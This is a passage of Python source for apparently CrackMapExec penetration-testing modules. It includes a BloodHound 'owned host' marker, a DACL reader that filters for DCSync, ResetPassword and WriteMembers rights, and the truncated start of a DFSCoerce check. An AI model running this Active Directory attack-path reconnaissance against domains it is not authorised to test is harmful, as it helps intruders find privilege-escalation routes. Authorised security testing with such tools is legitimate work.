""neo4j""\n\n        if module_options and ""URI"" in module_options:\n            self.neo4j_URI = module_options[""URI""]\n        if module_options and ""PORT"" in module_options:\n            self.neo4j_Port = module_options[""PORT""]\n        if module_options and ""USER"" in module_options:\n            self.neo4j_user = module_options[""USER""]\n        if module_options and ""PASS"" in module_options:\n            self.neo4j_pass = module_options[""PASS""]\n\n    def on_admin_login(self, context, connection):\n        if context.local_auth:\n            domain = connection.conn.getServerDNSDomainName()\n        else:\n            domain = connection.domain\n\n        host_fqdn = f""{connection.hostname}.{domain}"".upper()\n        uri = f""bolt://{self.neo4j_URI}:{self.neo4j_Port}""\n        context.log.debug(f""Neo4j URI: {uri}"")\n        context.log.debug(f""User: {self.neo4j_user}, Password: {self.neo4j_pass}"")\n\n        try:\n            driver = GraphDatabase.driver(uri, auth=(self.neo4j_user, self.neo4j_pass), encrypted=False)\n        except AuthError:\n            context.log.fail(f""Provided Neo4J credentials ({self.neo4j_user}:{self.neo4j_pass}) are"" "" not valid. See --options"")\n            sys.exit()\n        except ServiceUnavailable:\n            context.log.fail(f""Neo4J does not seem to be available on {uri}. See --options"")\n            sys.exit()\n        except Exception as e:\n            context.log.fail(""Unexpected error with Neo4J"")\n            context.log.debug(f""Error {e}: "")\n            sys.exit()\n\n        with driver.session() as session:\n            with session.begin_transaction() as tx:\n                result = tx.run(f\'MATCH (c:Computer {{name:""{host_fqdn}""}}) SET c.owned=True RETURN\' "" c.name AS name"")\n                record = result.single()\n                try:\n                    value = record.value()\n                except AttributeError:\n                    value = []\n        if len(value) > 0:\n            context.log.success(f""Node {host_fqdn} successfully set as owned in BloodHound"")\n        else:\n            context.log.fail(f""Node {host_fqdn} does not appear to be in Neo4J database. Have you"" "" imported the correct data?"")\n        driver.close()\n', 'daclread.py': 'import binascii\nimport codecs\nimport json\nimport re\nimport datetime\nfrom enum import Enum\nfrom impacket.ldap import ldaptypes\nfrom impacket.uuid import bin_to_string\nfrom cme.helpers.msada_guids import SCHEMA_OBJECTS, EXTENDED_RIGHTS\nfrom ldap3.protocol.formatters.formatters import format_sid\nfrom ldap3.utils.conv import escape_filter_chars\nfrom ldap3.protocol.microsoft import security_descriptor_control\n\nOBJECT_TYPES_GUID = {}\nOBJECT_TYPES_GUID.update(SCHEMA_OBJECTS)\nOBJECT_TYPES_GUID.update(EXTENDED_RIGHTS)\n\n# Universal SIDs\nWELL_KNOWN_SIDS = {\n    ""S-1-0"": ""Null Authority"",\n    ""S-1-0-0"": ""Nobody"",\n    ""S-1-1"": ""World Authority"",\n    ""S-1-1-0"": ""Everyone"",\n    ""S-1-2"": ""Local Authority"",\n    ""S-1-2-0"": ""Local"",\n    ""S-1-2-1"": ""Console Logon"",\n    ""S-1-3"": ""Creator Authority"",\n    ""S-1-3-0"": ""Creator Owner"",\n    ""S-1-3-1"": ""Creator Group"",\n    ""S-1-3-2"": ""Creator Owner Server"",\n    ""S-1-3-3"": ""Creator Group Server"",\n    ""S-1-3-4"": ""Owner Rights"",\n    ""S-1-5-80-0"": ""All Services"",\n    ""S-1-4"": ""Non-unique Authority"",\n    ""S-1-5"": ""NT Authority"",\n    ""S-1-5-1"": ""Dialup"",\n    ""S-1-5-2"": ""Network"",\n    ""S-1-5-3"": ""Batch"",\n    ""S-1-5-4"": ""Interactive"",\n    ""S-1-5-6"": ""Service"",\n    ""S-1-5-7"": ""Anonymous"",\n    ""S-1-5-8"": ""Proxy"",\n    ""S-1-5-9"": ""Enterprise Domain Controllers"",\n    ""S-1-5-10"": ""Principal Self"",\n    ""S-1-5-11"": ""Authenticated Users"",\n    ""S-1-5-12"": ""Restricted Code"",\n    ""S-1-5-13"": ""Terminal Server Users"",\n    ""S-1-5-14"": ""Remote Interactive Logon"",\n    ""S-1-5-15"": ""This Organization"",\n    ""S-1-5-17"": ""This Organization"",\n    ""S-1-5-18"": ""Local System"",\n    ""S-1-5-19"": ""NT Authority"",\n    ""S-1-5-20"": ""NT Authority"",\n    ""S-1-5-32-544"": ""Administrators"",\n    ""S-1-5-32-545"": ""Users"",\n    ""S-1-5-32-546"": ""Guests"",\n    ""S-1-5-32-547"": ""Power Users"",\n    ""S-1-5-32-548"": ""Account Operators"",\n    ""S-1-5-32-549"": ""Server Operators"",\n    ""S-1-5-32-550"": ""Print Operators"",\n    ""S-1-5-32-551"": ""Backup Operators"",\n    ""S-1-5-32-552"": ""Replicators"",\n    ""S-1-5-64-10"": ""NTLM Authentication"",\n    ""S-1-5-64-14"": ""SChannel Authentication"",\n    ""S-1-5-64-21"": ""Digest Authority"",\n    ""S-1-5-80"": ""NT Service"",\n    ""S-1-5-83-0"": ""NT VIRTUAL MACHINE\\Virtual Machines"",\n    ""S-1-16-0"": ""Untrusted Mandatory Level"",\n    ""S-1-16-4096"": ""Low Mandatory Level"",\n    ""S-1-16-8192"": ""Medium Mandatory Level"",\n    ""S-1-16-8448"": ""Medium Plus Mandatory Level"",\n    ""S-1-16-12288"": ""High Mandatory Level"",\n    ""S-1-16-16384"": ""System Mandatory Level"",\n    ""S-1-16-20480"": ""Protected Process Mandatory Level"",\n    ""S-1-16-28672"": ""Secure Process Mandatory Level"",\n    ""S-1-5-32-554"": ""BUILTIN\\Pre-Windows 2000 Compatible Access"",\n    ""S-1-5-32-555"": ""BUILTIN\\Remote Desktop Users"",\n    ""S-1-5-32-557"": ""BUILTIN\\Incoming Forest Trust Builders"",\n    ""S-1-5-32-556"": ""BUILTIN\\\\Network Configuration Operators"",\n    ""S-1-5-32-558"": ""BUILTIN\\Performance Monitor Users"",\n    ""S-1-5-32-559"": ""BUILTIN\\Performance Log Users"",\n    ""S-1-5-32-560"": ""BUILTIN\\Windows Authorization Access Group"",\n    ""S-1-5-32-561"": ""BUILTIN\\Terminal Server License Servers"",\n    ""S-1-5-32-562"": ""BUILTIN\\Distributed COM Users"",\n    ""S-1-5-32-569"": ""BUILTIN\\Cryptographic Operators"",\n    ""S-1-5-32-573"": ""BUILTIN\\Event Log Readers"",\n    ""S-1-5-32-574"": ""BUILTIN\\Certificate Service DCOM Access"",\n    ""S-1-5-32-575"": ""BUILTIN\\RDS Remote Access Servers"",\n    ""S-1-5-32-576"": ""BUILTIN\\RDS Endpoint Servers"",\n    ""S-1-5-32-577"": ""BUILTIN\\RDS Management Servers"",\n    ""S-1-5-32-578"": ""BUILTIN\\Hyper-V Administrators"",\n    ""S-1-5-32-579"": ""BUILTIN\\Access Control Assistance Operators"",\n    ""S-1-5-32-580"": ""BUILTIN\\Remote Management Users"",\n}\n\n\n# GUID rights enum\n# GUID thats permits to identify extended rights in an ACE\n# https://docs.microsoft.com/en-us/windows/win32/adschema/a-rightsguid\nclass RIGHTS_GUID(Enum):\n    WriteMembers = ""bf9679c0-0de6-11d0-a285-00aa003049e2""\n    ResetPassword = ""00299570-246d-11d0-a768-00aa006e0529""\n    DS_Replication_Get_Changes = ""1131f6aa-9c07-11d1-f79f-00c04fc2dcd2""\n    DS_Replication_Get_Changes_All = ""1131f6ad-9c07-11d1-f79f-00c04fc2dcd2""\n\n\n# ACE flags enum\n# New ACE at the end of SACL for inheritance and access return system-audit\n# https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-addauditaccessobjectace\nclass ACE_FLAGS(Enum):\n    CONTAINER_INHERIT_ACE = ldaptypes.ACE.CONTAINER_INHERIT_ACE\n    FAILED_ACCESS_ACE_FLAG = ldaptypes.ACE.FAILED_ACCESS_ACE_FLAG\n    INHERIT_ONLY_ACE = ldaptypes.ACE.INHERIT_ONLY_ACE\n    INHERITED_ACE = ldaptypes.ACE.INHERITED_ACE\n    NO_PROPAGATE_INHERIT_ACE = ldaptypes.ACE.NO_PROPAGATE_INHERIT_ACE\n    OBJECT_INHERIT_ACE = ldaptypes.ACE.OBJECT_INHERIT_ACE\n    SUCCESSFUL_ACCESS_ACE_FLAG = ldaptypes.ACE.SUCCESSFUL_ACCESS_ACE_FLAG\n\n\n# ACE flags enum\n# For an ACE, flags that indicate if the ObjectType and the InheritedObjecType are set with a GUID\n# Since these two flags are the same for Allowed and Denied access, the same class will be used from \'ldaptypes\'\n# https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-access_allowed_object_ace\nclass OBJECT_ACE_FLAGS(Enum):\n    ACE_OBJECT_TYPE_PRESENT = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT\n    ACE_INHERITED_OBJECT_TYPE_PRESENT = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_INHERITED_OBJECT_TYPE_PRESENT\n\n\n# Access Mask enum\n# Access mask permits to encode principal\'s rights to an object. This is the rights the principal behind the specified SID has\n# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/7a53f60e-e730-4dfe-bbe9-b21b62eb790b\n# https://docs.microsoft.com/en-us/windows/win32/api/iads/ne-iads-ads_rights_enum?redirectedfrom=MSDN\nclass ACCESS_MASK(Enum):\n    # Generic Rights\n    GenericRead = 0x80000000  # ADS_RIGHT_GENERIC_READ\n    GenericWrite = 0x40000000  # ADS_RIGHT_GENERIC_WRITE\n    GenericExecute = 0x20000000  # ADS_RIGHT_GENERIC_EXECUTE\n    GenericAll = 0x10000000  # ADS_RIGHT_GENERIC_ALL\n\n    # Maximum Allowed access type\n    MaximumAllowed = 0x02000000\n\n    # Access System Acl access type\n    AccessSystemSecurity = 0x01000000  # ADS_RIGHT_ACCESS_SYSTEM_SECURITY\n\n    # Standard access types\n    Synchronize = 0x00100000  # ADS_RIGHT_SYNCHRONIZE\n    WriteOwner = 0x00080000  # ADS_RIGHT_WRITE_OWNER\n    WriteDACL = 0x00040000  # ADS_RIGHT_WRITE_DAC\n    ReadControl = 0x00020000  # ADS_RIGHT_READ_CONTROL\n    Delete = 0x00010000  # ADS_RIGHT_DELETE\n\n    # Specific rights\n    AllExtendedRights = 0x00000100  # ADS_RIGHT_DS_CONTROL_ACCESS\n    ListObject = 0x00000080  # ADS_RIGHT_DS_LIST_OBJECT\n    DeleteTree = 0x00000040  # ADS_RIGHT_DS_DELETE_TREE\n    WriteProperties = 0x00000020  # ADS_RIGHT_DS_WRITE_PROP\n    ReadProperties = 0x00000010  # ADS_RIGHT_DS_READ_PROP\n    Self = 0x00000008  # ADS_RIGHT_DS_SELF\n    ListChildObjects = 0x00000004  # ADS_RIGHT_ACTRL_DS_LIST\n    DeleteChild = 0x00000002  # ADS_RIGHT_DS_DELETE_CHILD\n    CreateChild = 0x00000001  # ADS_RIGHT_DS_CREATE_CHILD\n\n\n# Simple permissions enum\n# Simple permissions are combinaisons of extended permissions\n# https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc783530(v=ws.10)?redirectedfrom=MSDN\nclass SIMPLE_PERMISSIONS(Enum):\n    FullControl = 0xF01FF\n    Modify = 0x0301BF\n    ReadAndExecute = 0x0200A9\n    ReadAndWrite = 0x02019F\n    Read = 0x20094\n    Write = 0x200BC\n\n\n# Mask ObjectType field enum\n# Possible values for the Mask field in object-specific ACE (permitting to specify extended rights in the ObjectType field for example)\n# Since these flags are the same for Allowed and Denied access, the same class will be used from \'ldaptypes\'\n# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/c79a383c-2b3f-4655-abe7-dcbb7ce0cfbe\nclass ALLOWED_OBJECT_ACE_MASK_FLAGS(Enum):\n    ControlAccess = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS\n    CreateChild = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CREATE_CHILD\n    DeleteChild = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_DELETE_CHILD\n    ReadProperty = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_READ_PROP\n    WriteProperty = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_WRITE_PROP\n    Self = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_SELF\n\n\nclass CMEModule:\n    """"""\n    Module to read and backup the Discretionary Access Control List of one or multiple objects.\n    This module is essentially inspired from the dacledit.py script of Impacket that we have coauthored, @_nwodtuhs and me.\n    It has been converted to an LDAPConnection session, and improvements on the filtering and the ability to specify multiple targets have been added.\n    It could be interesting to implement the write/remove functions here, but a ldap3 session instead of a LDAPConnection one is required to write.\n    """"""\n\n    name = ""daclread""\n    description = ""Read and backup the Discretionary Access Control List of objects. Based on the work of @_nwodtuhs and @BlWasp_. Be carefull, this module cannot read the DACLS recursively, more explains in the  options.""\n    supported_protocols = [""ldap""]\n    opsec_safe = True\n    multiple_hosts = False\n\n    def __init__(self, context=None, module_options=None):\n        self.context = context\n        self.module_options = module_options\n\n    def options(self, context, module_options):\n        """"""\n        Be carefull, this module cannot read the DACLS recursively. For example, if an object has particular rights because it belongs to a group, the module will not be able to see it directly, you have to check the group rights manually.\n        TARGET          The objects that we want to read or backup the DACLs, sepcified by its SamAccountName\n        TARGET_DN       The object that we want to read or backup the DACL, specified by its DN (usefull to target the domain itself)\n        PRINCIPAL       The trustee that we want to filter on\n        ACTION          The action to realise on the DACL (read, backup)\n        ACE_TYPE        The type of ACE to read (Allowed or Denied)\n        RIGHTS          An interesting right to filter on (\'FullControl\', \'ResetPassword\', \'WriteMembers\', \'DCSync\')\n        RIGHTS_GUID     A right GUID that specify a particular rights to filter on\n        """"""\n        self.context = context\n\n        if not module_options:\n            context.log.fail(""Select an option, example: -M daclread -o TARGET=Administrator ACTION=read"")\n            exit(1)\n\n        if module_options and ""TARGET"" in module_options:\n            if re.search(r""^(.+)\\/([^\\/]+)$"", module_options[""TARGET""]) is not None:\n                try:\n                    self.target_file = open(module_options[""TARGET""], ""r"")\n                    self.target_sAMAccountName = None\n                except Exception as e:\n                    context.log.fail(""The file doesn\'t exist or cannot be openned."")\n            else:\n                self.target_sAMAccountName = module_options[""TARGET""]\n                self.target_file = None\n            self.target_DN = None\n        self.target_SID = None\n        if module_options and ""TARGET_DN"" in module_options:\n            self.target_DN = module_options[""TARGET_DN""]\n            self.target_sAMAccountName = None\n            self.target_file = None\n\n        if module_options and ""PRINCIPAL"" in module_options:\n            self.principal_sAMAccountName = module_options[""PRINCIPAL""]\n        else:\n            self.principal_sAMAccountName = None\n        self.principal_sid = None\n\n        if module_options and ""ACTION"" in module_options:\n            self.action = module_options[""ACTION""]\n        else:\n            self.action = ""read""\n        if module_options and ""ACE_TYPE"" in module_options:\n            self.ace_type = module_options[""ACE_TYPE""]\n        else:\n            self.ace_type = ""allowed""\n        if module_options and ""RIGHTS"" in module_options:\n            self.rights = module_options[""RIGHTS""]\n        else:\n            self.rights = None\n        if module_options and ""RIGHTS_GUID"" in module_options:\n            self.rights_guid = module_options[""RIGHTS_GUID""]\n        else:\n            self.rights_guid = None\n        self.filename = None\n\n    def on_login(self, context, connection):\n        """"""\n        On a successful LDAP login we perform a search for the targets\' SID, their Security Decriptors and the principal\'s SID if there is one specified\n        """"""\n\n        context.log.highlight(""Be carefull, this module cannot read the DACLS recursively."")\n        self.baseDN = connection.ldapConnection._baseDN\n        self.ldap_session = connection.ldapConnection\n\n        # Searching for the principal SID\n        if self.principal_sAMAccountName is not None:\n            _lookedup_principal = self.principal_sAMAccountName\n            try:\n                self.principal_sid = format_sid(\n                    self.ldap_session.search(\n                        searchBase=self.baseDN,\n                        searchFilter=""(sAMAccountName=%s)"" % escape_filter_chars(_lookedup_principal),\n                        attributes=[""objectSid""],\n                    )[0][\n                        1\n                    ][0][\n                        1\n                    ][0]\n                )\n                context.log.highlight(""Found principal SID to filter on: %s"" % self.principal_sid)\n            except Exception as e:\n                context.log.fail(""Principal SID not found in LDAP (%s)"" % _lookedup_principal)\n                exit(1)\n\n        # Searching for the targets SID and their Security Decriptors\n        # If there is only one target\n        if (self.target_sAMAccountName or self.target_DN) and self.target_file is None:\n            # Searching for target account with its security descriptor\n            try:\n                self.search_target_principal_security_descriptor(context, connection)\n                # Extract security descriptor data\n                self.target_principal_dn = self.target_principal[0]\n                self.principal_raw_security_descriptor = str(self.target_principal[1][0][1][0]).encode(""latin-1"")\n                self.principal_security_descriptor = ldaptypes.SR_SECURITY_DESCRIPTOR(data=self.principal_raw_security_descriptor)\n                context.log.highlight(""Target principal found in LDAP (%s)"" % self.target_principal[0])\n            except Exception as e:\n                context.log.fail(""Target SID not found in LDAP (%s)"" % self.target_sAMAccountName)\n                exit(1)\n\n            if self.action == ""read"":\n                self.read(context)\n            if self.action == ""backup"":\n                self.backup(context)\n\n        # If there are multiple targets\n        else:\n            targets = self.target_file.readlines()\n            for target in targets:\n                try:\n                    self.target_sAMAccountName = target.strip()\n                    # Searching for target account with its security descriptor\n                    self.search_target_principal_security_descriptor(context, connection)\n                    # Extract security descriptor data\n                    self.target_principal_dn = self.target_principal[0]\n                    self.principal_raw_security_descriptor = str(self.target_principal[1][0][1][0]).encode(""latin-1"")\n                    self.principal_security_descriptor = ldaptypes.SR_SECURITY_DESCRIPTOR(data=self.principal_raw_security_descriptor)\n                    context.log.highlight(""Target principal found in LDAP (%s)"" % self.target_sAMAccountName)\n                except Exception as e:\n                    context.log.fail(""Target SID not found in LDAP (%s)"" % self.target_sAMAccountName)\n                    continue\n\n                if self.action == ""read"":\n                    self.read(context)\n                if self.action == ""backup"":\n                    self.backup(context)\n\n    # Main read funtion\n    # Prints the parsed DACL\n    def read(self, context):\n        parsed_dacl = self.parse_dacl(context, self.principal_security_descriptor[""Dacl""])\n        self.print_parsed_dacl(context, parsed_dacl)\n        return\n\n    # Permits to export the DACL of the targets\n    # This function is called before any writing action (write, remove or restore)\n    def backup(self, context):\n        backup = {}\n        backup[""sd""] = binascii.hexlify(self.principal_raw_security_descriptor).decode(""latin-1"")\n        backup[""dn""] = str(self.target_principal_dn)\n        if not self.filename:\n            self.filename = ""dacledit-%s-%s.bak"" % (\n                datetime.datetime.now().strftime(""%Y%m%d-%H%M%S""),\n                self.target_sAMAccountName,\n            )\n        with codecs.open(self.filename, ""w"", ""latin-1"") as outfile:\n            json.dump(backup, outfile)\n        context.log.highlight(""DACL backed up to %s"", self.filename)\n        self.filename = None\n\n    # Attempts to retrieve the DACL in the Security Descriptor of the specified target\n    def search_target_principal_security_descriptor(self, context, connection):\n        _lookedup_principal = """"\n        # Set SD flags to only query for DACL\n        controls = security_descriptor_control(sdflags=0x04)\n        if self.target_sAMAccountName is not None:\n            _lookedup_principal = self.target_sAMAccountName\n            target = self.ldap_session.search(\n                searchBase=self.baseDN,\n                searchFilter=""(sAMAccountName=%s)"" % escape_filter_chars(_lookedup_principal),\n                attributes=[""nTSecurityDescriptor""],\n                searchControls=controls,\n            )\n        if self.target_DN is not None:\n            _lookedup_principal = self.target_DN\n            target = self.ldap_session.search(\n                searchBase=self.baseDN,\n                searchFilter=""(distinguishedName=%s)"" % _lookedup_principal,\n                attributes=[""nTSecurityDescriptor""],\n                searchControls=controls,\n            )\n        try:\n            self.target_principal = target[0]\n        except Exception as e:\n            context.log.fail(""Principal not found in LDAP (%s), probably an LDAP session issue."" % _lookedup_principal)\n            exit(0)\n\n    # Attempts to retieve the SID and Distinguisehd Name from the sAMAccountName\n    # Not used for the moment\n    #   - samname : a sAMAccountName\n    def get_user_info(self, context, samname):\n        self.ldap_session.search(\n            searchBase=self.baseDN,\n            searchFilter=""(sAMAccountName=%s)"" % escape_filter_chars(samname),\n            attributes=[""objectSid""],\n        )\n        try:\n            dn = self.ldap_session.entries[0].entry_dn\n            sid = format_sid(self.ldap_session.entries[0][""objectSid""].raw_values[0])\n            return dn, sid\n        except Exception as e:\n            context.log.fail(""User not found in LDAP: %s"" % samname)\n            return False\n\n    # Attempts to resolve a SID and return the corresponding samaccountname\n    #   - sid : the SID to resolve\n    def resolveSID(self, context, sid):\n        # Tries to resolve the SID from the well known SIDs\n        if sid in WELL_KNOWN_SIDS.keys():\n            return WELL_KNOWN_SIDS[sid]\n        # Tries to resolve the SID from the LDAP domain dump\n        else:\n            try:\n                dn = self.ldap_session.search(\n                    searchBase=self.baseDN,\n                    searchFilter=""(objectSid=%s)"" % sid,\n                    attributes=[""sAMAccountName""],\n                )[\n                    0\n                ][0]\n                samname = self.ldap_session.search(\n                    searchBase=self.baseDN,\n                    searchFilter=""(objectSid=%s)"" % sid,\n                    attributes=[""sAMAccountName""],\n                )[0][\n                    1\n                ][0][\n                    1\n                ][0]\n                return samname\n            except Exception as e:\n                context.log.debug(""SID not found in LDAP: %s"" % sid)\n                return """"\n\n    # Parses a full DACL\n    #   - dacl : the DACL to parse, submitted in a Security Desciptor format\n    def parse_dacl(self, context, dacl):\n        parsed_dacl = []\n        context.log.debug(""Parsing DACL"")\n        i = 0\n        for ace in dacl[""Data""]:\n            parsed_ace = self.parse_ace(context, ace)\n            parsed_dacl.append(parsed_ace)\n            i += 1\n        return parsed_dacl\n\n    # Parses an access mask to extract the different values from a simple permission\n    # https://stackoverflow.com/questions/28029872/retrieving-security-descriptor-and-getting-number-for-filesystemrights\n    #   - fsr : the access mask to parse\n    def parse_perms(self, fsr):\n        _perms = []\n        for PERM in SIMPLE_PERMISSIONS:\n            if (fsr & PERM.value) == PERM.value:\n                _perms.append(PERM.name)\n                fsr = fsr & (not PERM.value)\n        for PERM in ACCESS_MASK:\n            if fsr & PERM.value:\n                _perms.append(PERM.name)\n        return _perms\n\n    # Parses a specified ACE and extract the different values (Flags, Access Mask, Trustee, ObjectType, InheritedObjectType)\n    #   - ace : the ACE to parse\n    def parse_ace(self, context, ace):\n        # For the moment, only the Allowed and Denied Access ACE are supported\n        if ace[""TypeName""] in [\n            ""ACCESS_ALLOWED_ACE"",\n            ""ACCESS_ALLOWED_OBJECT_ACE"",\n            ""ACCESS_DENIED_ACE"",\n            ""ACCESS_DENIED_OBJECT_ACE"",\n        ]:\n            parsed_ace = {}\n            parsed_ace[""ACE Type""] = ace[""TypeName""]\n            # Retrieves ACE\'s flags\n            _ace_flags = []\n            for FLAG in ACE_FLAGS:\n                if ace.hasFlag(FLAG.value):\n                    _ace_flags.append(FLAG.name)\n            parsed_ace[""ACE flags""] = "", "".join(_ace_flags) or ""None""\n\n            # For standard ACE\n            # Extracts the access mask (by parsing the simple permissions) and the principal\'s SID\n            if ace[""TypeName""] in [""ACCESS_ALLOWED_ACE"", ""ACCESS_DENIED_ACE""]:\n                parsed_ace[""Access mask""] = ""%s (0x%x)"" % (\n                    "", "".join(self.parse_perms(ace[""Ace""][""Mask""][""Mask""])),\n                    ace[""Ace""][""Mask""][""Mask""],\n                )\n                parsed_ace[""Trustee (SID)""] = ""%s (%s)"" % (\n                    self.resolveSID(context, ace[""Ace""][""Sid""].formatCanonical()) or ""UNKNOWN"",\n                    ace[""Ace""][""Sid""].formatCanonical(),\n                )\n\n            # For object-specific ACE\n            elif ace[""TypeName""] in [\n                ""ACCESS_ALLOWED_OBJECT_ACE"",\n                ""ACCESS_DENIED_OBJECT_ACE"",\n            ]:\n                # Extracts the mask values. These values will indicate the ObjectType purpose\n                _access_mask_flags = []\n                for FLAG in ALLOWED_OBJECT_ACE_MASK_FLAGS:\n                    if ace[""Ace""][""Mask""].hasPriv(FLAG.value):\n                        _access_mask_flags.append(FLAG.name)\n                parsed_ace[""Access mask""] = "", "".join(_access_mask_flags)\n                # Extracts the ACE flag values and the trusted SID\n                _object_flags = []\n                for FLAG in OBJECT_ACE_FLAGS:\n                    if ace[""Ace""].hasFlag(FLAG.value):\n                        _object_flags.append(FLAG.name)\n                parsed_ace[""Flags""] = "", "".join(_object_flags) or ""None""\n                # Extracts the ObjectType GUID values\n                if ace[""Ace""][""ObjectTypeLen""] != 0:\n                    obj_type = bin_to_string(ace[""Ace""][""ObjectType""]).lower()\n                    try:\n                        parsed_ace[""Object type (GUID)""] = ""%s (%s)"" % (\n                            OBJECT_TYPES_GUID[obj_type],\n                            obj_type,\n                        )\n                    except KeyError:\n                        parsed_ace[""Object type (GUID)""] = ""UNKNOWN (%s)"" % obj_type\n                # Extracts the InheritedObjectType GUID values\n                if ace[""Ace""][""InheritedObjectTypeLen""] != 0:\n                    inh_obj_type = bin_to_string(ace[""Ace""][""InheritedObjectType""]).lower()\n                    try:\n                        parsed_ace[""Inherited type (GUID)""] = ""%s (%s)"" % (\n                            OBJECT_TYPES_GUID[inh_obj_type],\n                            inh_obj_type,\n                        )\n                    except KeyError:\n                        parsed_ace[""Inherited type (GUID)""] = ""UNKNOWN (%s)"" % inh_obj_type\n                # Extract the Trustee SID (the object that has the right over the DACL bearer)\n                parsed_ace[""Trustee (SID)""] = ""%s (%s)"" % (\n                    self.resolveSID(context, ace[""Ace""][""Sid""].formatCanonical()) or ""UNKNOWN"",\n                    ace[""Ace""][""Sid""].formatCanonical(),\n                )\n\n        else:\n            # If the ACE is not an access allowed\n            context.log.debug(""ACE Type (%s) unsupported for parsing yet, feel free to contribute"" % ace[""TypeName""])\n            parsed_ace = {}\n            parsed_ace[""ACE type""] = ace[""TypeName""]\n            _ace_flags = []\n            for FLAG in ACE_FLAGS:\n                if ace.hasFlag(FLAG.value):\n                    _ace_flags.append(FLAG.name)\n            parsed_ace[""ACE flags""] = "", "".join(_ace_flags) or ""None""\n            parsed_ace[""DEBUG""] = ""ACE type not supported for parsing by dacleditor.py, feel free to contribute""\n        return parsed_ace\n\n    # Prints a full DACL by printing each parsed ACE\n    #   - parsed_dacl : a parsed DACL from parse_dacl()\n    def print_parsed_dacl(self, context, parsed_dacl):\n        context.log.debug(""Printing parsed DACL"")\n        i = 0\n        # If a specific right or a specific GUID has been specified, only the ACE with this right will be printed\n        # If an ACE type has been specified, only the ACE with this type will be specified\n        # If a principal has been specified, only the ACE where he is the trustee will be printed\n        for parsed_ace in parsed_dacl:\n            print_ace = True\n            # Filter on specific rights\n            if self.rights is not None:\n                try:\n                    if (self.rights == ""FullControl"") and (self.rights not in parsed_ace[""Access mask""]):\n                        print_ace = False\n                    if (self.rights == ""DCSync"") and ((""Object type (GUID)"" not in parsed_ace) or (RIGHTS_GUID.DS_Replication_Get_Changes_All.value not in parsed_ace[""Object type (GUID)""])):\n                        print_ace = False\n                    if (self.rights == ""WriteMembers"") and ((""Object type (GUID)"" not in parsed_ace) or (RIGHTS_GUID.WriteMembers.value not in parsed_ace[""Object type (GUID)""])):\n                        print_ace = False\n                    if (self.rights == ""ResetPassword"") and ((""Object type (GUID)"" not in parsed_ace) or (RIGHTS_GUID.ResetPassword.value not in parsed_ace[""Object type (GUID)""])):\n                        print_ace = False\n                except Exception as e:\n                    context.log.fail(""Error filtering ACE, probably because of ACE type unsupported for parsing yet (%s)"" % e)\n\n            # Filter on specific right GUID\n            if self.rights_guid is not None:\n                try:\n                    if (""Object type (GUID)"" not in parsed_ace) or (self.rights_guid not in parsed_ace[""Object type (GUID)""]):\n                        print_ace = False\n                except Exception as e:\n                    context.log.fail(""Error filtering ACE, probably because of ACE type unsupported for parsing yet (%s)"" % e)\n\n            # Filter on ACE type\n            if self.ace_type == ""allowed"":\n                try:\n                    if (""ACCESS_ALLOWED_OBJECT_ACE"" not in parsed_ace[""ACE Type""]) and (""ACCESS_ALLOWED_ACE"" not in parsed_ace[""ACE Type""]):\n                        print_ace = False\n                except Exception as e:\n                    context.log.fail(""Error filtering ACE, probably because of ACE type unsupported for parsing yet (%s)"" % e)\n            else:\n                try:\n                    if (""ACCESS_DENIED_OBJECT_ACE"" not in parsed_ace[""ACE Type""]) and (""ACCESS_DENIED_ACE"" not in parsed_ace[""ACE Type""]):\n                        print_ace = False\n                except Exception as e:\n                    context.log.fail(""Error filtering ACE, probably because of ACE type unsupported for parsing yet (%s)"" % e)\n\n            # Filter on trusted principal\n            if self.principal_sid is not None:\n                try:\n                    if self.principal_sid not in parsed_ace[""Trustee (SID)""]:\n                        print_ace = False\n                except Exception as e:\n                    context.log.fail(""Error filtering ACE, probably because of ACE type unsupported for parsing yet (%s)"" % e)\n            if print_ace:\n                self.context.log.highlight(""%-28s"" % ""ACE[%d] info"" % i)\n                self.print_parsed_ace(parsed_ace)\n            i += 1\n\n    # Prints properly a parsed ACE\n    #   - parsed_ace : a parsed ACE from parse_ace()\n    def print_parsed_ace(self, parsed_ace):\n        elements_name = list(parsed_ace.keys())\n        for attribute in elements_name:\n            self.context.log.highlight(""    %-26s: %s"" % (attribute, parsed_ace[attribute]))\n\n    # Retrieves the GUIDs for the specified rights\n    def build_guids_for_rights(self):\n        _rights_guids = []\n        if self.rights_guid is not None:\n            _rights_guids = [self.rights_guid]\n        elif self.rights == ""WriteMembers"":\n            _rights_guids = [RIGHTS_GUID.WriteMembers.value]\n        elif self.rights == ""ResetPassword"":\n            _rights_guids = [RIGHTS_GUID.ResetPassword.value]\n        elif self.rights == ""DCSync"":\n            _rights_guids = [\n                RIGHTS_GUID.DS_Replication_Get_Changes.value,\n                RIGHTS_GUID.DS_Replication_Get_Changes_All.value,\n            ]\n        self.context.log.highlight(""Built GUID: %s"", _rights_guids)\n        return _rights_guids\n', 'dfscoerce.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nfrom impacket import system_errors\nfrom impacket.dcerpc.v5 import transport\nfrom impacket.dcerpc.v5.ndr import NDRCALL\nfrom impacket.dcerpc.v5.dtypes import ULONG, WSTR, DWORD\nfrom impacket.dcerpc.v5.rpcrt import DCERPCException\nfrom impacket.uuid import uuidtup_to_bin\nfrom cme.logger import cme_logger\n\n\nclass CMEModule:\n    name = ""dfscoerce""\n    description = ""Module to check if the DC is vulnerable to DFSCocerc, credit to @filip_dragovic/@Wh04m1001 and @topotam""\n    supported_protocols = [""smb""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def 